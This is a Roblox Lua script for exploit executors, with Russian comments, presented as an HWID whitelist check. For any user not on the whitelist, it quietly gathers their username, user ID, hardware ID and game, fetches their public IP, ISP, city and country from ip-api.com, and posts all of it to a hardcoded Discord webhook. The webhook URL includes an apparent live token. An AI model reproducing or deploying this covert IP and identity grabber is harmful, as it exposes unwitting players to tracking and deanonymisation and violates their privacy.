local player = game:GetService("Players").LocalPlayer
local lp = game:GetService("Players").LocalPlayer
local valid = false

-- 1. ОБНОВИ ЭТУ БЕЛЫЙ СПИСОК СВОИМИ ДАННЫМИ:
local whitelist = {
    {HWID = 'C017884D-908B-4482-ACDB-2E4A3C1476CF', IP = "mybadbro1337"},
    -- Добавь свои HWID сюда
    -- {HWID = 'ЕЩЕ_ОДИН_HWID', IP = "ЕЩЕ_ОДИН_НИК"},
}

if game:IsLoaded() then
    local player_name = player.Name
    local player_id = player.UserId
    
    -- 2. ЗАМЕНИ ЭТУ ССЫЛКУ НА СВОЙ DISCORD WEBHOOK:
    local webhook_url = "https://discord.com/api/webhooks/1456754463422418995/c2Ak9Vr2AcRRP9dDuCCYUfJvdnY6T0vFcffpbmhuYWrCakvLoJaN1rp-l6Ce05egl4i0"

    local hwid = game:GetService("RbxAnalyticsService"):GetClientId()

    local place_id = game.PlaceId
    local place_name = game:GetService("MarketplaceService"):GetProductInfo(place_id).Name

    -- Инициализируем ipinfo_table с дефолтными значениями на случай ошибки
    getgenv().ipinfo_table = {
        query = "N/A",
        isp = "N/A", 
        country = "N/A",
        city = "N/A",
        timezone = "N/A"
    }
    
    -- Пытаемся получить IP-информацию
    local success_ip, ip_response = pcall(function()
        local request_func = syn and syn.request or http_request or request
        if not request_func then
            return {Success = false, Body = '{}'}
        end
        return request_func({
            Url = "http://ip-api.com/json",
            Method = "GET"
        })
    end)
    
    if success_ip and ip_response and ip_response.Success and ip_response.Body then
        local success_json, decoded = pcall(function()
            return game:GetService("HttpService"):JSONDecode(ip_response.Body)
        end)
        if success_json and decoded then
            getgenv().ipinfo_table = decoded
        end
    end

    local current_time = os.date("%Y-%m-%d %H:%M:%S")

    local embed = {
        {
            ["title"] = "Executed",
            ["description"] = "User data",
            ["color"] = 0xFF0000,
            ["fields"] = {
                {
                    ["name"] = "Name",
                    ["value"] = player_name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Display name",
                    ["value"] = lp.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "ID",
                    ["value"] = tostring(player_id),
                    ["inline"] = true
                },
                {
                    ["name"] = "HWID",
                    ["value"] = hwid,
                    ["inline"] = false
                },
                {
                    ["name"] = "Game",
                    ["value"] = place_name,
                    ["inline"] = false
                },
                {
                    ["name"] = "Time",
                    ["value"] = current_time,
                    ["inline"] = false
                },
                {
                    ["name"] = "IP",
                    ["value"] = getgenv().ipinfo_table.query or "N/A",
                    ["inline"] = false
                },
                {
                    ["name"] = "Provider",
                    ["value"] = getgenv().ipinfo_table.isp or "N/A",
                    ["inline"] = true
                },
                {
                    ["name"] = "Country",
                    ["value"] = getgenv().ipinfo_table.country or "N/A",
                    ["inline"] = true
                },
                {
                    ["name"] = "City",
                    ["value"] = getgenv().ipinfo_table.city or "N/A",
                    ["inline"] = true
                },
                {
                    ["name"] = "Time zone",
                    ["value"] = getgenv().ipinfo_table.timezone or "N/A",
                    ["inline"] = true
                }
            }
        }
    }

    for _, whitelisted_player in ipairs(whitelist) do
        if whitelisted_player.HWID == hwid then
            valid = true
            break
        end
    end

    if valid then
        print('You are in whitelist!')
    else
        print('You are not in whitelist')
        local success_webhook, error_msg = pcall(function()
            local request_func = syn and syn.request or http_request or request
            if not request_func then
                error("No request function available")
            end
            return request_func({
                Url = webhook_url,
                Method = "POST",
                Headers = {
                    ["Content-Type"] = "application/json"
                },
                Body = game:GetService("HttpService"):JSONEncode({["embeds"] = embed})
            })
        end)
    end
end
